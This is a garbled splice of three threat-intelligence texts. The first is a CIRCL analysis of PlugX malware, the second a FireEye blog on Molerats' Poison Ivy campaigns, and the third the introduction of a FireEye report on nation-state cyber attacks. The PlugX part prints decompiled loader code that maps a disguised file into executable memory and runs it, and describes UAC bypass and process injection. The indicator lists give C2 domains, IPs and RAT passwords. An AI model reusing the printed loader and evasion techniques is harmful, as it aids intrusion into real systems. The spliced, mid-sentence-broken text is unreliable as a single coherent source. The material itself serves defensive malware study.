       10      Version : 1 3 , 1 1 , 0 , 0
       11      F i l e v e r s i o n : 13 ,11 ,102 ,0
       12      Strong Name: Unsigned
       13      O r i g i n a l Name: McVsMap.EXE
       14      I n t e r n a l Name: McVsMap
       15      Copyright : Copyright � 2008 McAfee , Inc .However, the work is only covering small aspects
(based on the indicators given, lacking full context) and not an exhaustive analysis, and hence
the report is as-is, not giving any guarantees of completeness or claiming absolute accuracy.This work is provided for information only.</section>
<section>
<heading>2.2   Sharing</heading>
The document is classiﬁed as TLP:WHITE, CIRCL authorizes everyone to share this analysis
report as-is without modiﬁcation.</section>
<header>3     Executive summary</header>
<section>
The analyzed malicious software is an exhaustive Remote Access Tool (RAT) that defeats several
protection methods of modern Windows operating systems, including execution of signed code
and defeating UAC in Windows 7.It comes with a multitude of functionalities that are well
implemented.</section>
<header>4     Analysis</header>
<section>
<heading>4.1   Techniques used</heading>
The analysis has been done using a mixed-approach of dynamic analysis and static analysis in
order to overcome some of the obfuscation and encryptions used by the malware.Some of the
techniques might have also an impact on the interpretation of the malware.Unfortunately, when
we started this investigation, the IP address is no longer accepting connections on the given ports
when tested on 2013-03-26.An interaction following the protocol of this malware is therefore no
longer possible..A
                                                       Sample



                                   .drops         .drops                  .drops



                    .l. oads     .l. oads    .Sample B                       Sample C                      Sample D
                                         .into                          .into



               .execution


                                                                   .decryption
                    .Sample E


                                                         .W indows 7 : def eat U AC
               .execution      .inject

                                                                                                         .Legend
                                                                                                    ..k ill            ..inject     .Signed
                    svchost.exe                                    Sample F
                                                                                                          code

                                                                                                    .Neutral
               .execution                                                                                code
                                                         ..Malicious
                    .code
                    msiexec.exe
</figure>
</section>

<section>
 <heading>4.2.2     Explanation</heading>
 Sample A is a self-extracting archive which contains three ﬁles, Sample B, Sample C and Sample
 D. It is assumed that Sample A is a part of another attack vector, like PDF or Oﬃce document
 attacks where the user just opens a crafted document which exploits the document reader, drops
 and opens both a readable document and a malicious ﬁle like Sample A....A 262672    119784 mcvsmap .exe
10   2013−03−13 0 9 : 5 2 : 2 8 ....A  49152     20285 McUtil .DLL
11   2013−03−13 1 4 : 5 6 : 1 2 ....A 124820    124820 McUtil .DLL.PPT
12   −−−−−−−−−−−−−−−−−−− −−−−− −−−−−−−−−−−− −−−−−−−−−−−− −−−−−−−−−−−−−−−−−−−−−−−−
13                                        436644    264889 3 f i l e s , 0 f o l d e r s</figure>

     Executing the self-extracting archive extracts the ﬁles and runs mcvsmap.exe (Sample B).Sample
     B is a valid signed ﬁle that the author of the malware took from a software bundle from McAfee.Sample B, when executed, attempts to load a ﬁle McUtil.DLL from the same directory, which
     usually is another component of McAfee.The malware author instead bundled the valid McAfee
     ﬁle Sample B with a custom DLL (Sample C).d l l .ppt = CreateFileW(&filename , GENERIC_READ, 1u , 0 , OPEN_EXISTING, 0 ,
            0) ;
 6   if ( hFile_mcutil .d l l .ppt == −1 )
 7   {
 8      r e s u l t = GetLastError ( ) ;
 9   }
10   else
11   {
12      b u f f e r = V i r t u a l A l l o c ( 0 , 0x100000u , MEM_COMMIT, PAGE_EXECUTE_READWRITE) ;
13      if ( b u f f e r && ReadFile ( hFile_mcutil .d l l .ppt , b u f f e r , 0x100000u , &NumberOfBytesRead
                , 0) )
14      {
15          CloseHandle ( hFile_mcutil .d l l .A handle to the ﬁlename McUtil.DLL.PPT is created in line 5.In line 12 an exectuable
   memory region is created, which is ﬁlled with the content of the ﬁle McUtil.DLL.PPT (line 13).After closing the handle to the ﬁle (line 15), the memory region is called (line 16).The next
   screenshot shows that the memory contains only pure code without any overhead like MZ/PE
   headers.v8 ) ;
17   }
18   return 0 ;
19 }
</code>

   The decrypted and decompressed ﬁle is not written onto disk, it always remains in memory.Sample E is the extracted version of this memory segment.At this point it can be mentioned
   that neither the encrypted Sample D nor the decrypted memory segment Sample E are detected
   by Virus scanners.After some initialisation work like adjusting tokens (SeDebugPrivilege, SeTcbPrivileg6 , to act as
   part of the operating system), a new process is started, the original svchost.exe from Microsoft,
   and the code from Sample E is injected into the memory of that process.In a next step,
   svchost.exe is instructed to execute the original msiexec.exe from Microsoft, where also memory
   is injected like it has been done for svchost.exe.Special conditions apply when run under Window
   7, which is protected by User Account Control (UAC).UAC is supposed to protect the user better
   from running malware by requesting the administator for approval before running a potentially
   dangerous application.In the environment of Windows 7, the malware drops temporarily ﬁle
   Sample F, which it uses to evade or defeat the UAC mechanism.After killing the parent processes,
   only two processes are left: svchost and msiexec.Both are veriﬁed binaries, none of the includes
   a malicious DLL.<figure></figure>

   Nevertheless, they both contain the malicious code.At this point in time the malware is already
   talking to the C&C, no user interaction was required, all standard security mechanisms were
   defeated.In
     addition, XPlugOption can create a thread that calls MessageBoxW() in order to present a
     message box to the user.</section>
     <section>
     <heading>4.4.2   Disk</heading>
     XPlugDisk is used to enumerate connected disk drives and can be used to ﬁnd and manipulate
     ﬁles and directories.In addition, XPlugDisk can be used to create a process, optionally on a
     hidden Windows desktop with the name ”HH”, as the code below illustrates:
     <code>
 1    if ( a1−>hidden )
 2     {
 3        hDesktop = CreateDesktopW (L"HH" , 0 , 0 , 0 , 0x10000000u , 0) ;
 4        if ( !hDesktop )
 5             l o g ( "XPlugDisk.cpp" , 665 , 0) ;
 6     }
 7     hidden = a1−>hidden ;
 8     S t a r t u p I n f o .lpDesktop = ( hidden != 0 ?L"HH" : 0) ;
 9     S t a r t u p I n f o .cb = 6 8 ;
10     S t a r t u p I n f o .dwFlags = 1 ;
11     S t a r t u p I n f o .wShowWindow = hidden == 0 ;
12     if ( CreateProcessW ( 0 , &a1−>commandline , 0 , 0 , 0 , 0 , 0 , 0 , &StartupInfo , &
               ProcessInformation ) )
13     {
14     ...
15     }
</code>
</section>

<section>
     <heading>4.4.3   Screen</heading>
     XPlugScreen is not only taking screenshots, it is also implementing remote desktop capabilities.It is able to capture the screen (internal command: ScreenT1) and can send mouse and keyboard
     events (internal command: ScreenT2).</section>
<section>
     <heading>4.4.4   Process</heading>
     XPlugProcess implements three commands and is able to enumerate, create and kill processes.</section>
<section>
     <heading>4.4.5   Service</heading>
     In the module XPlugService commands are available related to Windows services.Code is
     implemented to query service conﬁgurations, change service conﬁguration, start, control and
     delete services.</section>
<section>
     <heading>4.4.6   Shell</heading>
     A remote shell for the attacker is created in the module XPlugShell, by creating an asynchronous
     set of pipes (\pipe\a and \pipe\b) for cmd.exe and the console attached to it (AttachConsole()).</section>
<section>
    <heading>4.4.8      RegEdit</heading>
    XPlugRegedit implements a set of commands to process the Windows registry.It is able to
    enumerate, create, delete and copy keys.It is also able to enumerate, set, delete and get values
    from the registry.</section>
<section>
    <heading>4.4.9      Nethood</heading>
    XPlugNethood is the module to enumerate network resources like network shares.</section>
<section>
    <heading>4.4.10       Portmap</heading>
    XPlugPortMap indicates that it performs some port mapping, however, the code is not under-
    stood, yet.</section>
<section>
    <heading>4.4.11       SQL</heading>
    XPlugSQL implements three functions to query SQL servers: a function to get data source
    information, a function to get the driver description and a function to execute SQL statements.</section>
<section>
    <heading>4.4.12       Netstat</heading>
    XPlugNetstat gets the TCP and UDP connection table and is able to set TCP table entries.</section>
<section>
    <heading>4.4.13       Keylogger</heading>
    The keylogger implemented in XPlugKeyLogger catches Window titles, date, time and logs
    entered keys into the ﬁle
<figure>1 C: \ Documents and S e t t i n g s \ A l l Users \VirusMap\NvSmart .hlp</figure>

    It has the format following the example below:
<figure>1   2013−03−26 0 9 : 4 0 : 5 7 | C: \ Program F i l e s \ M o z i l l a F i r e f o x \ f i r e f o x .exe − M o z i l l a F i r e f o x
2   www.g o o g l e .com
3
4   2013−03−26 0 9 : 4 7 : 4 9 | C: \WINDOWS\system32\notepad .exe | U n t i t l e d − Notepad
5   This i s not a password
6
7   2013−03−26 0 9 : 4 8 : 0 6 | C: \WINDOWS\ Explorer .EXE | C: \ Documents and S e t t i n g s \ A l l Users \
        VirusMap</figure>
</section>

<section>
    <heading>4.5      Other notable commands and functions</heading>
    <heading>4.5.1      log</heading>
    This function is called almost everywhere when the author expects that a functions returns an
    error, at 1036 places.This is obviously done to ensure code quality.log , 0x800u ) ;
 4   // %ALLUSERSPROFILE%\SxS\bug .l o g
 5   lstrcatW(&path_to_bug .log , L"\\SxS" ) ;
 6   CreateDirectoryW(&path_to_bug .log , 0) ;
 7   SetFileAttributesW(&path_to_bug .log , 6u) ;
 8   lstrcatW(&path_to_bug .log , L"\\bug.log" ) ;
 9   r e s u l t = CreateFileW(&path_to_bug .log , 0x40000000u , 1u , 0 , 4u , 2u , 0) ;
10   if ( r e s u l t != −1 )
11   {
12       if ( S e t F i l e P o i n t e r ( r e s u l t , 0 , 0 , 2u) != −1 )
13      {
14           GetLocalTime(&SystemTime ) ;
15          NumberOfBytesWritten = wsprintfW (
16                                                       &Buffer ,
17                                                       L"%4.4d -%2.2d -%2.2d %2.2d:%2.2d:%2.2d: " ,
18                                                       SystemTime .wYear ,
19                                                       SystemTime .wMonth,
20                                                       SystemTime .wDay,
21                                                       SystemTime .wHour ,
22                                                       SystemTime .wMinute ,
23                                                       SystemTime .wSecond ) ;
24           if ( WriteFile ( r e s u l t , &Buffer , 2 * NumberOfBytesWritten , &NumberOfBytesWritten ,
                     0) )
25          {
26              l e n = lstrlenW ( l p B u f f e r ) ;
27              WriteFile ( r e s u l t , l p B u f f e r , 2 * len , &len , 0) ;
28          }
29      }
30       r e s u l t = CloseHandle ( r e s u l t ) ;
31   }
32   return r e s u l t ;
33 }
</code>
   Example log ﬁle entries from ﬁle
 <figure>
 1 %ALLUSERSPROFILE%\SxS\bug .l o g
 </figure>


 <figure>
 1 2013−03−25 1 1 : 4 3 : 2 8 : f i l e : XSetting .h , l i n e : 57 , e r r o r : [ 1 3 0 0 ] Not a l l p r i v i l e g e s
        r e f e r e n c e d are a s s i g n e d to the c a l l e r .2 2013−03−25 1 1 : 5 1 : 1 2 : f i l e : XInstallUAC .cpp , l i n e : 162 , e r r o r : [ 5 ] Access i s denied .3 2013−03−25 1 3 : 5 9 : 4 5 : f i l e : XRTL.cpp , l i n e : 186 , e r r o r : [ 1 3 0 0 ] Not a l l p r i v i l e g e s
        r e f e r e n c e d are a s s i g n e d to the c a l l e r .4 2013−03−25 1 4 : 0 7 : 1 2 : f i l e : XRTL.cpp , l i n e : 186 , e r r o r : [ 1 2 3 ] The filename , d i r e c t o r y
       name , or volume l a b e l syntax i s i n c o r r e c t .5 2013−03−25 1 4 : 0 7 : 1 2 : f i l e : XSetting .h , l i n e : 58 , e r r o r : [ 3 ] The system cannot f i n d the
       path s p e c i f i e d .6 2013−03−25 1 4 : 2 1 : 1 2 : f i l e : dllmain .cpp , l i n e : 47 , e r r o r : [ 1 3 0 0 ] Not a l l p r i v i l e g e s
        r e f e r e n c e d are a s s i g n e d to the c a l l e r .7 2013−03−25 1 7 : 3 1 : 5 8 : f i l e : X I n s t a l l .cpp , l i n e : 451 , e r r o r : [ 5 ] Access i s denied .8 2013−03−25 1 7 : 3 7 : 0 0 : f i l e : XSoTcpHttp .Another option is the installation as a service in
<figure>       
1 HKEY_LOCAL_MACHINE\SYSTEM\ ControlSet001 \ S e r v i c e s \VirusMap
</figure>
     The key ”Imagepath” calls the same binary mcvsmap.exe (Sample B).</section>
<section>
     <heading>4.7      Control</heading>
     The attacked computer uses TCP and UDP to connect to port 443 on help.yahoo-upgrade.com
     (122.199.194.197).Unfortunately, the machine at that IP address doesn’t seem to reply to our
     requests anymore on 2013-03-26.The Passive DNS showed some other associated domains and hostnames with this IP address:
<figure>     
1     help .yahoo−upgrade .com
2     support .yahoo−upgrade .com
3     update .ayuisyahooapis .com
4     support .ayuisyahooapis .com
5     update .t r e n d m i c r o s o f t .co .i n
</figure>
     It’s highly probable that theses hostnames were also used for other campaigns.You might use
     these as additional indicators for the detection of potential infections.<figure></figure>

<figure>
 1   inetnum :        122.199.128.0 − 122.199.255.255
 2   netname :        VAAN
 3   descr :          NexG
 4   descr :          5F SeoulAcademy B/D, 967−6 Daechi−Dong , Gangnam−Gu, 135−280
 5   descr :          ************************************************
 6   descr :          All o c at ed to KRNIC Member .7   descr :           I f you would l i k e to f i n d assignment
 8   descr :          i nform ation i n d e t a i l p l e a s e r e f e r to
 9   descr :          the KRNIC Whois Database at :
10   descr :          "http :// whois.nic.or.kr/english/index.html"
11   descr :          ************************************************
12   country :        KR
13   admin−c :        SL1625−AP
14   tech−c :         SL1625−AP
15   remarks :        www.nexg .net
16   status :         ALLOCATED PORTABLE
17   mnt−by :         MNT−KRNIC−AP
18   mnt−lower :      MNT−KRNIC−AP
19   changed :        hm−changed@apnic .net 20060606
20   source :         APNIC
21
22   person :         Sanguk Lee
23   nic−hdl :        SL1625−AP
24   e−mail :         ip@nexg .net
25   address :        5F SeoulAcademy B/D, 967−6 Daechi−Dong , Gangnam−Gu, 135−280
26   phone :          +82−2−538−7060
27   fax−no :         +82−2−571−8998
28   country :        KR
29   changed :        hostmaster@nida .or .To obtain more s p e c i f i c information , p l e a s e use the
44   remarks :           KRNIC whois s e r v e r at whois .k r n i c .net .45   changed :           hostmaster@nic .or .kr
46   source :            KRNIC
</figure>
</section>


<section>
     <heading>4.8.2      Domain</heading>
<figure>
 1     Domain Name: YAHOO−UPGRADE.COM
 2      R e g i s t r a r : JIANGSU BANGNING SCIENCE & TECHNOLOGY CO. LTD
 3      Whois Server : whois .5 5 h l .com
 4      R e f e r r a l URL: http : / /www.5 5 h l .com
 5      Name Server : DNS5.4CUN.COM
 6      Name Server : DNS6.4CUN.COM
 7      Status : ok
 8      Updated Date : 08−aug−2012
 9      Creation Date : 18− j u l −2011
10      Expiration Date : 18−j u l −2013
11
12   >>> Last update o f whois database : Wed, 27 Mar 2013 2 2 : 3 6 : 1 3 UTC <<<
13
14   Domain Name: yahoo−upgrade .com
15
16   R e g i s t r a n t Contact :
17   yahoo
18   yahoo yahoo whiteyoo_123@yahoo .com
19   telephone : +48.56756756756
20   fax : +48.56732453453
21   yahoo yahoo yahoo 345345
22   CA
23
24   Administrative Contact :
25   yahoo yahoo whiteyoo_123@yahoo .com
26   telephone : +48.56756756756
27   fax : +48.56732453453
28   yahoo yahoo yahoo 345345
29   CA
30
31   Technical Contact :
32   yahoo yahoo whiteyoo_123@yahoo .com
33   telephone : +48.56756756756
34   fax : +48.56732453453
35   yahoo yahoo yahoo 345345
36   CA
37
38   B i l l i n g Contact :
39   yahoo yahoo whiteyoo_123@yahoo .0 ( mcvsmap) ( f k i n g )ǰ ( ) \ s h e l l c o d e \ s h e l l c o d e \XPlug .h
</figure>
    This could mean PlugX, version 7.0 codename fking, build for mcvsmap.References can be
    found on the internet for previous versions of this malware family:
<figure>    
1   d : \ work\ plug4 .0 ( nvsmart ) ( s x l ) \ s h e l l c o d e \ s h e l l c o d e \XPlug .h
2   d : \ work\ plug3 .1 ( icesword ) \ s h e l l c o d e \ s h e l l c o d e \XPlug .h
3   d : \ work\Plug3 .0 ( Gf )UDP\ S h e l l 6 \ Release \ S h e l l 6 .pdb
4   i : \ work\ plug2 .0 ( ) \ s h e l l c o d e \ s h e l l c o d e \XPlug .h
</figure>
</section>


  <header>A        Appendix</header>
  <section>
    <heading>A.1        Indicators of Compromise (IOC)</heading>
    This section summarizes the known indicators of compromise.The list might not be exhaustive,
    but the existence of any or all of the following indicators might help to discover an infection.l o g
5   C: \ Documents and S e t t i n g s \ A l l Users \VirusMap\NvSmart .hlp
</figure>
</section>

<section>
    <heading>A.1.3    Registry</heading>
<figure>
1 HKEY_LOCAL_MACHINE\SYSTEM\ ControlSet001 \ S e r v i c e s \VirusMap and a key r e f e r e n c i n g Sample
      B
2 HKEY_CURRENT_USER\ Software \ M i c r o s o f t \Windows\ CurrentVersion \Run and a key r e f e r e n c i n g
      Sample B
</figure>
</section>
<section>
    <heading>A.1.4    Network (hostname and destination IP addresses)</heading>
<figure>
1 help .yahoo−upgrade .com
2 122.199.194.197
</figure>
</section>

<section>
    <heading>A.2     References</heading>
       • WHITE PAPER: PLUG X - PAYLOAD EXTRACTION
             – http://www.contextis.com/files/PlugX_-_Payload_Extraction_March_2013_1.Agent .AZDK
   2   nProtect :              Trojan .Agent .AZDK
   3   McAfee :                RDN/ Generic BackDoor !gq
   4   Malwarebytes :          Trojan .Dropper .CH
   5   Symantec :              WS.Reputation .1
   6   Norman :                Agent .APIJH
   7   TrendMicro−HouseCall : BKDR_POISON.PQ
   8   Avast :                 Win32 : Gulpix−B [ Trj ]
   9   Kaspersky :             Backdoor .Win32 .Gulpix .bo
  10   BitDefender :           Trojan .Agent .AZDK
  11   Agnitum :               Backdoor .Gulpix !EFaRR6zLtc4
  12   ViRobot :               Backdoor .Win32 .A.Gulpix .3 7 0 7 0 2 .B
  13   Comodo :                UnclassifiedMalware
  14   F−Secure :              Trojan .Agent .AZDK
  15   DrWeb:                  Trojan .Click2 .52215
  16   VIPRE:                  Trojan .Win32 .Generic !BT
  17   AntiVir :               TR/Agent .azdk .3
  18   TrendMicro :            BKDR_POISON.PQ
  19   McAfee−GW−Edition :     RDN/ Generic BackDoor !gq
  20   Sophos :                Troj /Agent−AATT
  21   Kingsoft :              Win32 .Hack .Gulpix .( kcloud )
  22   Microsoft :             Backdoor : Win32/Plugx .A
  23   GData :                 Trojan .Agent .AZDK
  24   AhnLab−V3 :             Backdoor/Win32 .Gulpix
  25   I karu s :              Backdoor .Win32 .Gulpix
  26   Fortinet :              W32/Gulpix .BO!t r .Agent .AZDK
   2   nProtect :              Trojan .Agent .AZDK
   3   McAfee :                RDN/ Generic BackDoor !gt
   4   Malwarebytes :          Backdoor .Gulpix
   5   Symantec :              WS.Reputation .1
   6   Norman :                Agent .APIJH
   7   TrendMicro−HouseCall : TROJ_GEN.RCBCRCJ
   8   Avast :                 Win32 : Gulpix−B [ Trj ]
   9   Kaspersky :             Backdoor .Win32 .Gulpix .bo
  10   BitDefender :           Trojan .Agent .AZDK
  11   Agnitum :               Backdoor .Gulpix !EFaRR6zLtc4
  12   Comodo :                UnclassifiedMalware
  13   F−Secure :              Trojan .Agent .AZDK
  14   DrWeb:                  Trojan .Click2 .52215
  15   VIPRE:                  Trojan .Win32 .Generic !BT
  16   AntiVir :               TR/Agent .azdk .2
  17   TrendMicro :            TROJ_GEN.RCBCRCJ
  18   McAfee−GW−Edition :     RDN/ Generic BackDoor !gt
  19   Sophos :                Troj /Agent−AATT
  20   Microsoft :             Backdoor : Win32/Plugx .A
  21   GData :                 Trojan .Agent .AZDK
  22   Commtouch :             W32/Backdoor .IYCB−5867
  23   I karu s :              Backdoor .Win32 .Gulpix
  24   Fortinet :              W32/Gulpix .BO!t r .bdr
  25   AVG:                    Agent4 .AKAP
  26   Panda :                 Trj /CI .A
  27   Scanned : 2013−03−21 1 3 : 4 6 : 1 0 − 44 scans − 26 d e t e c t i o n s (59.0%)
</figure>

  • Sample D (McUtil.DLL.PPT)
<figure>
   1 Not uploaded to VirusTotal .</figure>

  • Sample E
<figure>
   1 Not uploaded to VirusTotal .The  popular  remote  access  tool  (RAT),
which  we  recently  detailed  on  this  blog,  is  being  used  in  a  broad  campaign  of  attacks  launched  from  the  Middle
East,  too.Filter  by  Category
First,  some  background:                                                                                                                        Select Category


In  October  2012,  malware  attacks  against  Israeli  government  targets  grabbed  media  attention  as  officials  temporarily
cut  off  Internet  access  for  its  entire  police  force  and  banned  the  use  of  USB  memory  sticks.<fn>1</fn>  Security  researchers        Resources
subsequently  linked  these  attacks  to  a  broader,  yearlong  campaign  that  targeted  not  just  Israelis  but  Palestinians  as                                Definitive  Guide  to                                                                                                 <figure></figure>
well.<fn>2</fn>  —  and  as  discovered  later,  even  the  U.S.  and  UK  governments.<fn>5</fn> But  the  group  has  also  used  Poison  Ivy  (PIVY),  a  RAT  more  commonly
associated  with  threat  actors  in  China  <fn>6</fn>  —  so  much  so  that  PIVY  has,  inaccurately,  become  synonymous  with  all                                    Download
APT  attacks  linked  to  China.But  this  malware  was  signed,  and  —  in  contrast  to  the  compile  time,  which  can  be
         faked  —  the  signing  time  on  its  certificate  was  much  more  recent:  Monday,  July  08,  2013  1:45:10  A.M.Here  are  the  file  details:

Hamas shoot down Israeli F-16 fighter jet by modern weapon in Gaza sea.doc- – - – -
– - – - – - -.scr

MD5: 7084f3a2d63a16a191b7fcb2b19f0e0d

This  malware  was  signed  with  a  forged  Microsoft  certificate  similar  to  previous  XtremeRat  samples.But  the  serial
number  (which  is  often  reused  by  attackers,  enabling  FireEye  researchers  to  link  individual  attacks,  including  those
by  the  Molerats)  is  different  this  time.We  collected  additional  PIVY  samples  that  had  the  same  password  or  linked  to  CnC  infrastructure  at  a  common  IP
address  (or  both).We  observed  three  PIVY  passwords  (another  potential  identifier)  used  in  the  attacks:
“!@#GooD#@!”,  “!@#Goood#@!”  and  “admin100”.</section>
<section>
Additional  Samples  with  Middle  Eastern  Themes

We  also  found  a  PIVY  sample  used  by  this  group  that  leveraged  what  are  known  as  key  files  instead  of  passwords.The  PIVY  builder  allows  operators  to  load  .pik  files  containing  a  key  to  secure  communications  between  the
compromised  computer  and  the  attacker’s  machine.By  default,  PIVY  secures  these  communications  with  the  ascii
text  password  of  “admin”  —  when  the  same  non-­default  password  appears  in  multiple  attacks,  researchers  can
conclude  that  the  attacks  are  related.The  PIVY  sample  in  question  had  an  MD5  hash  of  9dff139bbbe476770294fb86f4e156ac  and  communicated  with  a
CnC  server  at  toornt.servegame.com  over  port  443.The  key  file  used  to  secure  communications  contained  the
following  ascii  string  ‘Password  (256  bits):\x0d\x0aA9612889F6’  (where  \x0d\x0a  represents  a  line  break).<figure></figure>

The  9dff139bbbe476770294fb86f4e156ac  sample  dropped  a  decoy  document  in  Arabic  that  included  a  transcript  of
an  interview  with  Salam  Fayyad,  the  former  Prime  Minister  of  the  Palestinian  National  Authority.The  sample  16346b95e6deef9da7fe796c31b9dec4  was  also  seen  communicating  with  toornt.servegame.com  over
port  443.This  sample  appears  to  have  been  delivered  to  its  targets  via  a  link  to  a  RAR  archive  labeled  Ramadan.rar
(fc554a0ad7cf9d4f47ec4f297dbde375)  hosted  at  the  Dropbox  file-­sharing  website.<figure></figure>
The  sample  a8714aac274a18f1724d9702d40030bf  dropped  a  decoy  document  in  Arabic  that  contained  a  biography  of
General  Adbel  Fattah  el-­Sisi  –  the  Commander-­in-­Chief  of  the  Egyptian  Armed  Forces.<figure></figure>
A  recent  sample  (d9a7c4a100cfefef995785f707be895c)  used  protests  in  Egypt  to  entice  recipients  to  open  a
malicious  file.<figure></figure>
Another  sample  (b0a9abc76a2b4335074a13939c59bfc9)  contained  a  decoy  with  a  grim  picture  of  Fadel  Al  Radfani,
who  was  the  adviser  to  the  defense  minister  of  Yemen  before  he  was  assassinated.Although  we  are  seeing  Egyptian-­  and  Middle  Eastern-­themed  attacks  using  decoy  content  in  Arabic,  we  cannot
determine  the  intended  targets  of  all  of  these  attacks.</section>
<section>
Delivery  Vector

We  believe  that  the  Molerats  attacker  uses  spear  phishing  to  deliver  weaponized  RAR  files  containing  their  malicious
payloads  to  their  victims  in  at  least  two  different  ways.The  Molerats  actor  will  in  some  cases  attach  the  weaponized
RAR  file  directly  to  their  spear-­  phishing-­emails.We  also  believe  that  this  actor  sends  spear-­phishing  emails  that
include  links  to  RAR  files  hosted  on  third-­party  platforms  such  as  Dropbox.In  one  such  example  we  found  the  following  link  was  used  to  host  Ramadan.rar
(fc554a0ad7cf9d4f47ec4f297dbde375):

hxxps://dl[.]dropboxusercontent[.]com/s/uiod7orcpykx2g8/Ramadan.rar?token_hash=AAHAVuiXpTkOKwar9e0WH-­
EfrK7PEB9O7t7WC6Tgtn315w&dl=1

CnC  Infrastructure

We  have  found  15  PIVY  samples  that  can  be  linked  through  common  passwords,  common  CnC  domain  names,  and
common  IP  addresses  to  which  the  CnC  domains  resolve.The  CnC  servers  for  this  cluster  of  activity  are:

        toornt.servegame.com

        updateo.servegame.com

        egypttv.sytes.net

        skype.servemp3.com

        natco2.no-­ip.net

Two  of  the  domain  names  (natco2.no-­ip.net  and  skype.servemp3.com)  that  were  used  as  CnCs  for  PIVY  were  both
documented  as  XtremeRat  CnCs  that  were  used  in  previous  attacks.<fn>8</fn>
<figure></figure>
We  focused  on  these  domains  and  their  IP  addresses  —  which  they  had  in  common  with  toornt.servegame.com.In
addition,  we  added  the  well-­known  CnCs  good.zapto.org  and  hint.zapto.org  used  in  previously  documented  attacks.By  observing  changes  in  DNS  resolution  that  occurred  within  the  same  timeframe,  we  were  able  to  ensure  that  the
passive  DNS  data  we  collected  was  the  same.Interestingly,  we  also  found  that  the  domains  often  shifted  to  a  new
IP  address  over  time.This  date  is  within  the  timeframe  of  the  original  XtremeRat  attacks,  but  the
payload  in  this  case  was  PIVY.This  indicates  that  the  attackers  have  been  using  PIVY  in  addition  to  XtremeRat  for
longer  than  we  had  originally  believed.</section>
<section>
Conclusion

We  do  not  know  whether  using  PIVY  is  an  attempt  by  those  behind  the  Molerats  campaign  to  frame  China-­based
threat  actors  for  their  attacks  or  simply  evidence  that  they  have  added  another  effective,  publicly-­available  RAT  to  its
arsenal.But  this  development  should  raise  a  warning  flag  for  anyone  tempted  to  automatically  attribute  all  PIVY
attacks  to  threat  actors  based  in  China.The  ubiquity  of  off-­the-­shelf  RATs  makes  determining  those  responsible  an
increasing  challenge.The  ongoing  attacks  are  also  heavily  leveraging  content  in  Arabic  that  uses  conflicts  in  Egypt  and  the  wider  Middle
East  to  lure  targets  into  opening  malicious  files.But  we  have  no  further  information  about  the  exact  targets  of  these
Arabic  lures.As  events  on  the  ground  in  the  Middle  East  —  and  in  Egypt  in  particular  —  receive  international  attention,  we  expect
the  Molerat  operators  to  continue  leveraging  these  headlines  to  catalyze  their  operations.The  Molerats  group  also  uses  addition  RATs  such  as  XtremeRat,  Cerberus,  Cybergate,  but  we  have  focused  on
their  used  of  PIVY  in  this  blog.8.  http://download01.norman.no/whitepapers/Cyberattack_against_Israeli_and_Palestinian_targets.pdf
</footnote>
<section>
Yara  Signature
This  Yara  signature  can  be  used  to  locate  signed  samples  that  have  the  new  certificate  serial  numbers  used  by
Molerats.Bookmark  the  permalink.FX  Series                                                      Partners
                                                                                                                                                                                                   Facebook
Why  FireEye?Privacy  &  Cookies  Policy  |  Site  Map  |  Site  Credits

</section>
</doc>Once limited to opportunistic criminals,
cyber attacks are becoming a key weapon for governments seeking to defend national sovereignty
and project national power.From strategic cyber espionage campaigns, such as Moonlight Maze and Titan Rain, to the destructive,
such as military cyber strikes on Georgia and Iran, human and international conflicts are entering a new
phase in their long histories.In this shadowy battlefield, victories are fought with bits instead of bullets,
malware instead of militias, and botnets instead of bombs.These covert assaults are largely unseen by the public.Unlike the wars of yesteryear, this cyber war
produces no dramatic images of exploding warheads, crumbled buildings, or fleeing civilians.But the
list of casualties—which already includes some of the biggest names in technology, financial services,
defense, and government —is growing larger by the day.A cyber attack is best understood not as an end in itself, but as a potentially powerful means to a wide
variety of political, military, and economic goals.“Serious cyber attacks are unlikely to be motiveless,” said Martin Libicki, Senior Scientist at RAND Corp.
“Countries carry them out to achieve certain ends, which tend to reflect their broader strategic goals.The relationship between the means chosen and their goals will look rational and reasonable to them if
not necessarily to us.”
Just as each country has a unique political system, history, and culture, state-sponsored attacks also
have distinctive characteristics, which include everything from motivation to target to type of attack.This report describes the unique characteristics of cyber attack campaigns waged by governments
worldwide.We hope that, armed with this knowledge, security professionals can better identify their
attackers and tailor their defenses accordingly.Here is a quick overview:
•	 Asia-Pacific.Home to large, bureaucratic hacker groups such as the “Comment Crew” who pursue
   many goals and targets in high-frequency, brute-force attacks.•	 Russia/Eastern Europe.These cyber attacks are more technically advanced and highly effective
   at evading detection.•	 Middle East.These hackers are dynamic, often using creativity, deception, and social engineering
   to trick users into compromising their own computers.•	 United States.The most complex, targeted, and rigorously engineered cyber attack campaigns
   to date.</section>


<footer>
FireEye, Inc.   World War C: Understanding Nation-State Motives Behind Today’s Advanced Cyber Attacks	       2
</footer>

<section>
<heading>Introduction</heading>
World War Z—a bestselling book and Hollywood movie—detailed a global pandemic in which politics
and culture deeply influenced how the public—and by extension, governments—reacted to a zombie
plague.In one passage, for example, an Arab boy refused to believe that the disease was real,
suspecting that Israel had fabricated the story.The nations described in World War Z—the United States,
China, Russia, South Korea, Israel, and many others—are involved in a very different type of conflict,
but one with real and growing national security impact: World War C, where “C” stands for “Cyber”.However, the same rule applies: each country has a unique political system, history, language, culture,
and understanding of human and international conflict.Cyber conflict often mirrors traditional conflict.For example, China uses high-volume cyber attacks
similar to how it used infantry during the Korean War.Many Chinese soldiers were sent into battle with
only a handful of bullets.Given their strength in numbers, they were still able to achieve battlefield
victories.On the other end of the spectrum lie Russia, the U.S., and Israel, whose cyber tactics are more
surgical, reliant on advanced technologies and the cutting-edge work of contractors who are driven by
competition and financial incentives.We are still at the dawn of the Internet Age.But cyber attacks have already proven themselves as
a low-cost, high-payoff way to defend national sovereignty and to project national power.Many of
today’s headlines seem to be pulled from the pages of a science fiction novel.Code so sophisticated it
destroys a nuclear centrifuge thousands of miles away.Malware that secretly records everything a user
does on a computer.A software program that steals data from any nearby device that has Bluetooth
connectivity.Encrypted code that decrypts only on one specific, target device.Such sophistication
speaks volumes about the maturity, size, and resources of the organizations behind these attacks.With
a few rare exceptions, these attacks are now in the exclusive realm of nation-states.“The international community has developed a solid understanding of cyber technology,” said Prof.
Michael N. Schmitt of the U.S.Naval War College, in an email interview.“What is missing is a grasp of
the geopolitical context in which such technology operates.Attribution determinations made without
sensitivity to the geopolitical surroundings are seldom reasonable.”
World War C, like any analogy, has its limits.Cyber war has been compared to special operations
forces, submarine warfare, missiles, assassins, nuclear weapons, Pearl Harbor, 9/11, Katrina, and more.Even our zombie analogy is not new.Often, any compromised computer, if it is actively under the
